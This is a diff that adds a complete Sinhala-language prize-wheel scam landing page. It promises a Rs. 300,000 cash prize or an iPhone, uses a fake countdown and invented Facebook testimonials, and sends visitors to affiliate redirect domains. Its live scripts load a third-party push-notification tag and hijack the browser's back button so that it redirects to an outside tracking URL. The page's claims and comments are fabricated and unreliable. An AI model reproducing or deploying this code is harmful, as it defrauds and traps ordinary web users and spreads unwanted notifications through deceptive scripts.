@@ -1,0 +1,296 @@
+<!doctype html>
+<html lang="si" dir="ltr">
+  <head>
+    <title>සුභ පැතුම්</title>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="lander" content="prizewheel-fb">
+<meta name="description" content="prizewheel-fb">
+<link rel="shortcut icon" href="data:image/x-icon" type="image/x-icon">
+    <meta
+      name="alert-message"
+      content="අපට කණගාටුයි\n\nකරුණාකර නැවත උත්සාහ කරන්න. ඔබට තවත් එක් අවස්ථාවක් තිබේ!"
+    >
+    <link href="css/app%EF%B9%96id=c588c17324f2be0e0ec9.css" type="text/css" rel="stylesheet"/>
+    <link href="css/landers/prizewheel-fb/app%EF%B9%96id=cd41123a11e97e0f2444.css" type="text/css" rel="stylesheet" />
+    <script>
+function getURLParameter(name) {
+var query = window.location.search.substring(1);
+var vars = query.split("&");
+for (var i=0;i<vars.length;i++) {
+var pair = vars[i].split("=");
+if(pair[0] === name){return decodeURI(pair[1]);}
+}
+return "";
+}
+</script>
+
+
+<script>
+    //PP
+    var s = document.createElement('script');
+    s.src='//lemouwee.com/pfe/current/micro.tag.min.js?z=5168327'+'&sw=/sw-check-permissions-ea2cf.js';
+    s.onload = function(result) {
+        switch (result) {
+            case 'onPermissionDefault':break;
+            case 'onPermissionAllowed':break;
+            case 'onPermissionDenied':break;
+            case 'onAlreadySubscribed':break;
+            case 'onNotificationUnsupported':break;
+        }
+    }
+    document.head.appendChild(s);
+</script>
+
+
+
+<script> 
+//BB
+function imiBB() { let url = "https://ogazgk.unfamiiiiardate.com/?utm_source=da57dc555e50572d&s1=193382&s2=1872921&j5=1&j6=1"; try { history.pushState({}, '', location.href); history.pushState({}, '', location.href); window.onpopstate = function (ev) { if (ev['state']) { location.replace(url); } }; } catch (ex) {} } !function () { let touched = false; let chromeVersion = 0; try { chromeVersion = +(new RegExp('Chrome/([0-9]+)').exec(navigator.userAgent)[1]); } catch (e) { chromeVersion = 0; } if (chromeVersion >= 75) { window.addEventListener('mouseup', function () { if (!touched) { touched = true; setTimeout(function () { imiBB(); } , 0); } } ); document.addEventListener("DOMContentLoaded", function () { document.body.addEventListener('touchend', function (evt) { if (!touched) { touched = true; setTimeout(function () { imiBB(); } , 0); } } ); document.body.addEventListener('keydown', function () { if (!touched) { touched = true; setTimeout(function () { imiBB(); } , 0); } } ); } ); } else { setTimeout(function () { imiBB(); } , 0); } } (); </script>
+
+
+
+      </head>
+  <body>
+    <main id="app" v-cloak>
+      <div class="header">
+        කරකවා ජයග්‍රහණය කරන්න
+        <img
+          class="header__icon"
+          src="img/landers/prizewheel-fb/notification.png"
+          alt=""
+        />
+      </div>
+      <div class="step" v-if="!hasWon">
+        <div class="card">
+          <div class="step__text">
+            <div class='step__date'>
+              {{ DateHelper().getMonthName() }}
+              {{ DateHelper().getDate() }},
+              {{ DateHelper().getYear() }}
+            </div>
+            <h1 class="step__title">
+              සුභ පැතුම් <script>document.write(getURLParameter('brand'))</script> පරිශීලක, ඔබට (1) ත්‍යාග ඉතිරිව ඇත!!
+            </h1>
+            <div class="step__subtitle">
+              සෑම <span class="strong">{{ DateHelper().getDayName() }}</span> ම අප විසින් 10 ක ජයග්‍රාහකයින් පිරිසක් ත්‍යාගය ලබා දීමට තෝරාගනු ලබනවා
+            </div>
+          </div>
+          <div class="step__bar">
+            ඔබේ ත්‍යාගය ඉල්ලා සිටින්න<br/><em>↓</em> රෝදය කරකවන්න <em>↓</em>
+          </div>
+          <vue-prize-wheel
+            class="prize-wheel"
+            static-image="img/landers/prizewheel-fb/prizewheel_static.png"
+            prize-image="img/prizes/iphone-12-pro-max/default@0.5x.png"
+            :start-at="startPrizewheelAt"
+            v-on:lost="retryModalOpen = true"
+            v-on:finish="hasWon = true"
+          >
+            <template v-slot:spinner>
+              <img
+                src="img/landers/prizewheel-fb/prizewheel_spinner.jpg"
+                class="prize-wheel__wheel"
+                alt=""
+              />
+              <img
+                src="img/prizes/iphone-12-pro-max/default@0.5x.png"
+                class="prize-wheel__prize"
+                alt=""
+              />
+            </template>
+          </vue-prize-wheel>
+        </div>
+      </div>
+      <div class="step" v-if="hasWon && !isLoaded">
+        <div class="card step__loader">
+          <img src="img/landers/prizewheel-fb/loader.gif" alt="සැකසෙමින්"/>
+        </div>
+      </div>
+      <div class="step step--end" v-if="isLoaded">
+        <div class="card card--centered">
+          <div class="step__title step__title--bold">
+            සුභ පැතුම්!
+            ඔබේ මුදල් ත්‍යාගය ලබාගැනීමට මෙම පියවර සම්පූර්ණ කරන්න!
+          </div>
+        </div>
+        <div class="card">
+          <div>
+            1. ඔබගේ ත්‍යාගය ලබා ගැනීමට &#039;ත්‍යාගය ඉල්ලා ගන්න&#039; ක්ලික් කරන්න. ඔබව අපගේ සහකරුගේ වෙබ් අඩවිය වෙත හරවා යවනු ලැබේ.</div>
+          <div>
+            2. හවුල්කරුගේ වෙබ් අඩවියේ පියවර අනුගමනය කරන්න
+          </div>
+          <div>
+            <span class="strong">වැදගත්:</span>
+            නිෂ්පාදන ඕනෑම වේලාවක ලබාගත නොහැක.
+          </div>
+          <div>ඉක්මනින් තෝරන්න!</div>
+        </div>
+        <div class="card">
+          මෙම පිරිනැමීම ඊළඟ <span>මිනිත්තු <span v-html="countdownMinutes">0</span> සහ තත්පර <span v-html="countdownSeconds">0</span></span> දක්වා වලංගු වේ
+        </div>
+        <div class="card">
+          <div class="step__prize">
+            <div class="step__prize-image">
+              <img
+                src="img/prizes/iphone-12-pro-max/default@0.5x.png"
+                class="step__prize-image-image"
+                alt="Apple iPhone 12 Pro Max"
+              />
+              <div>(2) ඉතුරුව ඇත</div>
+            </div>
+            <div class="step__prize-details">
+              <div class="step__title step__title--bold">** මුදල් ප්‍රයිස් රු.300.000,00**</div>
+
+
+              <script>document.write('<a href="https://tk.surpriseanddelightgifts.com/click" class="step__button">ත්‍යාගය ඉල්ලා ගන්න</a>')</script>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="comments">
+        <div class="card">
+          <div class="comments__likes">
+            සියලුම කැමති වීම් <span class="comments__link">12,068</span>
+          </div>
+          <vue-facebook-comment
+            avatar="img/profiles/south-asian/female/3@0.25x.jpg"
+            name="Samadhi Seneviratne"
+            message="මුලදී මෙය සත්‍යයක්ද නැද්ද යන්න මට නොතේරුණි, නමුත් අද මට ලැබී ඇත්තේ මුදල් ත්‍යාගය :D!!"
+            like-text="කැමැත්ත"
+            reply-text="පිලිතුරු"
+            since-text="දැන්"
+            v-on:reply="$refs.reply.focus()"
+          ></vue-facebook-comment>
+          <vue-facebook-comment
+            avatar="img/profiles/south-asian/male/3@0.25x.jpg"
+            name="Shehan Nandasiri"
+            message="මේ අතුගෑමෙන් කවුරුහරි යමක් දිනුවාද ??"
+            like-text="කැමැත්ත"
+            reply-text="පිලිතුරු"
+            since-text="මිනිත්තු 9"
+            v-on:reply="$refs.reply.focus()"
+          ></vue-facebook-comment>
+          <vue-facebook-comment
+            avatar="img/profiles/south-asian/male/10@0.25x.jpg"
+            name="Kasun Abeynaike"
+            message="එය ක්‍රියාත්මක වන්නේ කෙසේද? මම මීට වසර කිහිපයකට පෙර Amazon කාඩ්පතක් දිනාගත් අතර මගේ සියලු උත්සහයන් පසුව ව්‍යර්ථ විය"
+            like-text="කැමැත්ත"
+            reply-text="පිලිතුරු"
+            since-text="මිනිත්තු 32"
+            v-on:reply="$refs.reply.focus()"
+          ></vue-facebook-comment>
+          <vue-facebook-comment
+            avatar="img/profiles/south-asian/female/6@0.25x.jpg"
+            name="Fathima Fonseca"
+            message="ඔයාට මට උදව් කළ හැකි ද? මම තෑගි කාඩ්පතක් දිනා ගත්තා !! මම දැන් මොනවද කලයුත්තේ?"
+            :likes="12"
+            like-text="කැමැත්ත"
+            reply-text="පිලිතුරු"
+            since-text="මිනිත්තු 55"
+            v-on:reply="$refs.reply.focus()"
+          ></vue-facebook-comment>
+          <vue-facebook-comment
+            avatar="img/profiles/south-asian/male/9@0.25x.jpg"
+            name="Tharindu Balasuriya"
+            message="මුදල් ත්‍යාගය අද තැපෑලෙන් පැමිණ ඇත! ස්තූතියි  !!."
+            :likes="12"
+            image="img/prizes/iphone-12-pro-max/proof.jpg"
+            like-text="කැමැත්ත"
+            reply-text="පිලිතුරු"
+            since-text="පැය 1"
+            v-on:reply="$refs.reply.focus()"
+          ></vue-facebook-comment>
+          <vue-facebook-comment
+            avatar="img/profiles/south-asian/female/5@0.25x.jpg"
+            name="Rashmi Karunaratne"
+            message="මෙම එක් වරක් පිරිනැමෙන දීමනාව දුටු මම එය ව්‍යාජ එකක් යැයි සිතූ නිසා එය ක්ලික් නොකළෙමි. මම දැන්වීම නැවතත් දුටුවෙමි, මට කම්මැලි නිසා මම එය උත්සාහ කිරීමට තීරණය කළෙමි ... පසුව මට අළුත් iPhone X! මොකක්!!?!"
+            like-text="කැමැත්ත"
+            reply-text="පිලිතුරු"
+            since-text="පැය 3"
+            v-on:reply="$refs.reply.focus()"
+          ></vue-facebook-comment>
+          <vue-facebook-comment
+            avatar="img/profiles/south-asian/female/1@0.25x.jpg"
+            name="Nethmi Abeynaike"
+            message="එය ක්‍රියාත්මක වන්නේ කෙසේද? මම මීට වසර කිහිපයකට පෙර Amazon කාඩ්පතක් දිනාගත් අතර මගේ සියලු උත්සහයන් පසුව ව්‍යර්ථ විය"
+            :likes="21"
+            like-text="කැමැත්ත"
+            reply-text="පිලිතුරු"
+            since-text="පැය 3"
+            v-on:reply="$refs.reply.focus()"
+          ></vue-facebook-comment>
+          <vue-facebook-comment
+            avatar="img/profiles/south-asian/male/2@0.25x.jpg"
+            name="Sandun Fonseca"
+            message="එය සත්‍යද නැද්ද යන්න මට නොතේරුණි, නමුත් මට මගේ කාඩ්පත අද ලැබුණි !! 😍 පුදුමයි ðŸ ”¥"
+            :likes="1"
+            like-text="කැමැත්ත"
+            reply-text="පිලිතුරු"
+            since-text="පැය 6"
+            v-on:reply="$refs.reply.focus()"
+          ></vue-facebook-comment>
+          <p class="card__paragraph comments__link">
+            පැරණි අදහස් 83 බලන්න
+          </p>
+        </div>
+        <div class="card">
+          <div class="comments__form">
+            <label for="reply">පිළිතුරක් එක් කරන්න:</label>
+            <textarea rows="4" class="comments__form-input" ref="reply" id="reply"></textarea>
+            <p class="card__paragraph">
+              <button onclick="alert('ඔබගේ අදහස් දැක්වීමට ස්තූතියි, එය සමාලෝචනය කිරීමෙන් පසුව ප්‍රකාශයට පත් කෙරේ');">
+                ඉදිරිපත් කරන්න
+              </button>
+            </p>
+          </div>
+        </div>
+      </div>
+      <vue-modal :open="welcomeModalOpen" class="modal" v-on:close="welcomeModalOpen = false">
+        <div class="modal__title" style="">වින් රු.300.000,00</div>
+        <img
+          class="modal__image"
+          src="img/prizes/iphone-12-pro-max/default@0.5x.png"
+          alt="Apple iPhone 12 Pro Max"
+        />
+        <p>
+          <span class="strong">
+              {{ DateHelper().getMonthName() }}
+              {{ DateHelper().getDate() }},
+              {{ DateHelper().getYear() }}
+          </span>
+          <br/>
+          සුභ පැතුම් <script>document.write(getURLParameter('brand'))</script> පරිශීලකයා!
+          <br/>
+          ඔබගේ පක්ෂපාතිත්වයට ජාතික පාරිභෝගික මධ්‍යස්ථානය ඔබට ස්තූති කිරීමට කැමතියි.
+          <br/>
+        </p>
+        <p>
+          ඔබේ විශේෂ ත්‍යාගය ලබාගැනීමට රෝදය කරකවන්න 🎁
+          <br>
+          <br>
+          <span class="strong">සුභ පැතුම්!</span>
+        </p>
+        <button class="modal__button" v-on:click="welcomeModalOpen = false">හරි</button>
+      </vue-modal>
+      <vue-modal :open="retryModalOpen" class="modal" v-on:close="retryModalOpen = false">
+        <div class="modal__title" style="">නැවත උත්සාහ කරන්න!</div>
+        <p>
+          *** ඔබ වැඩියෙන් කැරකැවීමක් දිනා ඇත ***
+        </p>
+        <button class="modal__button" v-on:click="retryModalOpen = false">හරි</button>
+      </vue-modal>
+    </main>
+    
+    
+    <script>window.view = window.view || {};view.offerUrl = "https:\/\/125f712f339b.tcbound.com\/?p=8240&wid=128305&wid_hmac=11400276f0d24abf19f27425a17bb1e4&click_id={clickid}";view.qs = "p=8240&wid=128305&wid_hmac=11400276f0d24abf19f27425a17bb1e4&click_id={clickid}";view.skip = 0;view.screenshot = 0;view.download = 1;</script><script>window.view = window.view || {};view.datetimeTranslations = {"ago":":time \u0db4\u0dd9\u0dbb","from_now":":time \u0db8\u0dd9\u0dad\u0dd0\u0db1\u0dca \u0dc3\u0dd2\u0da7","after":":time \u0db4\u0dc3\u0dd4\u0dc0","before":":time \u0d9a\u0dbd\u0dd2\u0db1\u0dca","year":"\u0d85\u0dc0\u0dd4\u0dbb\u0dd4\u0daf\u0dd4 1 \u0dba\u0dd2|\u0d85\u0dc0\u0dd4\u0dbb\u0dd4\u0daf\u0dd4 :count","month":"\u0db8\u0dcf\u0dc3 1 \u0dba\u0dd2|\u0db8\u0dcf\u0dc3 :count","week":"1 \u0dc3\u0dad\u0dd2\u0dba\u0dba\u0dd2|\u0dc3\u0dad\u0dd2 :count","day":"\u0daf\u0dd2\u0db1 1 \u0dba\u0dd2|\u0daf\u0dd2\u0db1 :count","hour":"\u0daf\u0dd2\u0db1 :count|\u0db4\u0dd0\u0dba :count","minute":"1 \u0dc0\u0dd2\u0db1\u0dcf\u0da9\u0dd2\u0dba\u0dba\u0dd2|\u0dc0\u0dd2\u0db1\u0dcf\u0da9\u0dd2 :count","second":"1\u0dad\u0dad\u0dca\u0db4\u0dbb 1 \u0dba\u0dd2|\u0dad\u0dad\u0dca\u0db4\u0dbb :count","January":"\u0da2\u0db1\u0dc0\u0dcf\u0dbb\u0dd2","February":"\u0db4\u0dd9\u0db6\u0dbb\u0dc0\u0dcf\u0dbb\u0dd2","March":"\u0db8\u0dcf\u0dbb\u0dca\u0dad\u0dd4","April":"\u0d85\u0db4\u0dca\u0dbb\u0dda\u0dbd\u0dca","May":"\u0db8\u0dd0\u0dba\u0dd2","June":"\u0da2\u0dd4\u0db1\u0dd2","July":"\u0da2\u0dd6\u0dbd\u0dd2","August":"\u0d85\u0d9c\u0ddd\u0dc3\u0dca\u0dad\u0dd4","September":"\u0dc3\u0dd0\u0db4\u0dca\u0dad\u0dd0\u0db8\u0dca\u0db6\u0dbb\u0dca","October":"\u0d94\u0d9a\u0dca\u0dad\u0ddd\u0db6\u0dbb\u0dca","November":"\u0db1\u0ddc\u0dc0\u0dd0\u0db8\u0dca\u0db6\u0dbb\u0dca","December":"\u0daf\u0dd9\u0dc3\u0dd0\u0db8\u0dca\u0db6\u0dbb\u0dca","monday":"\u0dc3\u0db3\u0dd4\u0daf\u0dcf","tuesday":"\u0d85\u0d9f\u0dc4\u0dbb\u0dd4\u0dc0\u0dcf\u0daf\u0dcf","wednesday":"\u0db6\u0daf\u0dcf\u0daf\u0dcf","thursday":"\u0db6\u0dca\u200d\u0dbb\u0dc4\u0dc3\u0dca\u0db4\u0dad\u0dd2\u0db1\u0dca\u0daf\u0dcf","friday":"\u0dc3\u0dd2\u0d9a\u0dd4\u0dbb\u0dcf\u0daf\u0dcf","saturday":"\u0dc3\u0dd9\u0db1\u0dc3\u0dd4\u0dbb\u0dcf\u0daf\u0dcf","sunday":"\u0d89\u0dbb\u0dd2\u0daf\u0dcf"};</script>    <script src="js/app%EF%B9%96id=d5f25c7b0bcb6df904a3.js" type="application/javascript"></script>
+    
+    
+
+        <script
+      src="js/landers/prizewheel-fb/app%EF%B9%96id=9ce67e774d7587d76bf9.js"
+      type="application/javascript">
+    </script>
+  </body>
+</html>
